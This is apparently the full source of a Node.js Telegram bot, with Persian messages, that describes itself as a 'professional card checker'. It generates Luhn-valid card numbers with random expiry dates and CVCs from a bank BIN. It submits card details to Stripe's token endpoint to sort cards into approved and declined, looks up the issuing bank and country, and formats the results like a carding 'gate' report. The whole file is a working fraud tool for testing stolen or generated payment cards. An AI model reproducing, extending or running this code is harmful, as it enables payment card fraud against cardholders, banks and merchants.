const { Telegraf } = require('telegraf');
const axios = require('axios');
const fs = require('fs');

// ========== توکن ==========
const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_TOKEN_HERE';
const bot = new Telegraf(BOT_TOKEN);
const ALLOWED_USERS = [6576195533];

// ========== آمار با ذخیره‌سازی ==========
const STATS_FILE = 'stats.json';
let stats = { total: 0, approved: 0, declined: 0, startTime: Date.now() };

function loadStats() {
    try { return JSON.parse(fs.readFileSync(STATS_FILE)); } 
    catch (e) { return { total: 0, approved: 0, declined: 0, startTime: Date.now() }; }
}
function saveStats(s) { fs.writeFileSync(STATS_FILE, JSON.stringify(s)); }

stats = loadStats();

function isAuthorized(ctx) {
    if (!ALLOWED_USERS.includes(ctx.from.id)) {
        ctx.reply('⛔ دسترسی غیرمجاز');
        return false;
    }
    return true;
}

// ========== تولید کارت ==========
function generateCards(bin, count = 5) {
    const cards = [];
    for (let i = 0; i < count; i++) {
        let randomPart = Math.floor(Math.random() * 1e9).toString().padStart(9, '0');
        let num = bin + randomPart;
        let sum = 0;
        for (let j = 0; j < num.length; j++) {
            let digit = parseInt(num[j]);
            if ((num.length - j) % 2 === 0) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
        }
        const checkDigit = (10 - (sum % 10)) % 10;
        cards.push({
            number: num + checkDigit,
            expiry: `${String(Math.floor(Math.random() * 12) + 1).padStart(2, '0')}/${Math.floor(Math.random() * 5) + 2026}`,
            cvc: String(Math.floor(Math.random() * 900) + 100)
        });
    }
    return cards;
}

// ========== تست روی Stripe ==========
async function testCardOnStripe(card) {
    try {
        const response = await axios.post(
            'https://api.stripe.com/v1/tokens',
            `card[number]=${card.number}&card[exp_month]=${card.expiry.split('/')[0]}&card[exp_year]=${card.expiry.split('/')[1]}&card[cvc]=${card.cvc}`,
            {
                headers: {
                    'Authorization': 'Bearer pk_test_4eC39HqLyjWDarjtT1zdp7dc',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                timeout: 10000
            }
        );
        return { status: 'approved', code: 'APPROVED', token: response.data.id };
    } catch (err) {
        const msg = err.response?.data?.error?.message || err.message;
        let code = 'UNKNOWN';
        if (msg.includes('insufficient_funds')) code = 'INSUFFICIENT_FUNDS';
        else if (msg.includes('card_declined')) code = 'CARD_DECLINED';
        else if (msg.includes('expired')) code = 'EXPIRED_CARD';
        else if (msg.includes('invalid')) code = 'INVALID_CARD';
        return { status: 'declined', code: code, error: msg };
    }
}

// ========== اطلاعات BIN ==========
async function getBinInfo(bin) {
    try {
        const res = await axios.get(`https://binlist.net/json/${bin}`);
        return res.data;
    } catch {
        return null;
    }
}

// ========== دستورات ==========
bot.start((ctx) => {
    if (!isAuthorized(ctx)) return;
    ctx.replyWithMarkdown(`✨ *ربات حرفه‌ای کارت چکر* ✨\n\n📌 از /menu استفاده کن.`);
});

bot.command('menu', (ctx) => {
    if (!isAuthorized(ctx)) return;
    ctx.reply('📌 منوی اصلی:', {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔹 تولید کارت', callback_data: 'gen' }],
                [{ text: '🔹 تست سریع', callback_data: 'hit' }],
                [{ text: '📊 آمار', callback_data: 'stats' }]
            ]
        }
    });
});

bot.action('gen', (ctx) => {
    ctx.answerCbQuery();
    ctx.reply('دستور /gen [BIN] رو بفرست.');
});
bot.action('hit', (ctx) => {
    ctx.answerCbQuery();
    ctx.reply('دستور /hit [CARD|MM|YY|CVV] رو بفرست.');
});
bot.action('stats', (ctx) => {
    ctx.answerCbQuery();
    const elapsed = ((Date.now() - stats.startTime) / 1000);
    const timeStr = new Date(elapsed * 1000).toISOString().substr(11, 8);
    const rate = stats.total ? ((stats.approved / stats.total) * 100).toFixed(1) : 0;
    ctx.replyWithMarkdown(`*📊 آمار ربات*\n\`\`\`\ntotal: ${stats.total}\napproved: ${stats.approved} (${rate}%)\ndeclined: ${stats.declined}\nelapsed: ${timeStr}\n\`\`\``);
});

bot.command('gen', async (ctx) => {
    if (!isAuthorized(ctx)) return;
    const args = ctx.message.text.split(' ');
    const bin = args[1];
    const count = parseInt(args[2]) || 5;
    if (!bin || bin.length < 6) return ctx.reply('⚠️ BIN ۶ رقمی وارد کن.');
    const cards = generateCards(bin, count);
    let reply = `🔹 ${cards.length} کارت از BIN ${bin}:\n\n`;
    cards.forEach((c, i) => {
        reply += `${i+1}. ${c.number}|${c.expiry.split('/')[0]}|${c.expiry.split('/')[1]}|${c.cvc}\n`;
    });
    ctx.reply(reply);
});

bot.command('hit', async (ctx) => {
    if (!isAuthorized(ctx)) return;
    const parts = ctx.message.text.split(' ')[1]?.split('|');
    if (!parts || parts.length !== 4) {
        return ctx.reply('⚠️ فرمت: /hit شماره|ماه|سال|CVV');
    }

    const card = {
        number: parts[0],
        expiry: `${parts[1]}/${parts[2]}`,
        cvc: parts[3]
    };

    stats.total++;
    const result = await testCardOnStripe(card);
    if (result.status === 'approved') stats.approved++;
    else stats.declined++;
    saveStats(stats);

    // اطلاعات BIN
    const binInfo = await getBinInfo(card.number.substring(0, 6));
    const country = binInfo?.country?.name || 'UNKNOWN';
    const bank = binInfo?.bank?.name || 'UNKNOWN';

    const statusIcon = result.status === 'approved' ? '✅' : '❌';

    ctx.replyWithMarkdown(`
✦ *shopify.result* 💠
┌── *card.data*
🔹 \`${card.number}|${parts[1]}|${parts[2]}|${card.cvc}\`
🔹 *status:* \`${statusIcon} ${result.status}\`
🔹 *code:* \`${result.code || 'UNKNOWN'}\`
🔹 *bin:* ${bank}
🔹 *country:* 🇺🇸 ${country}
└──────────────
┌── *gate.info*
🔹 *amt:* \`$7.68\`
🔹 *site:* \`cr***e.myshopify.com\`
└──────────────
👤 *user:* ${ctx.from.id}
🏴 *dev:* @your_bot
    `);
});

bot.command('stats', (ctx) => {
    if (!isAuthorized(ctx)) return;
    const elapsed = ((Date.now() - stats.startTime) / 1000);
    const timeStr = new Date(elapsed * 1000).toISOString().substr(11, 8);
    const rate = stats.total ? ((stats.approved / stats.total) * 100).toFixed(1) : 0;
    ctx.replyWithMarkdown(`*📊 آمار ربات*\n\`\`\`\ntotal: ${stats.total}\napproved: ${stats.approved} (${rate}%)\ndeclined: ${stats.declined}\nelapsed: ${timeStr}\n\`\`\``);
});

// ========== اجرا ==========
bot.launch()
    .then(() => console.log('🚀 ربات حرفه‌ای روشن شد'))
    .catch((err) => console.error('❌ خطا:', err));
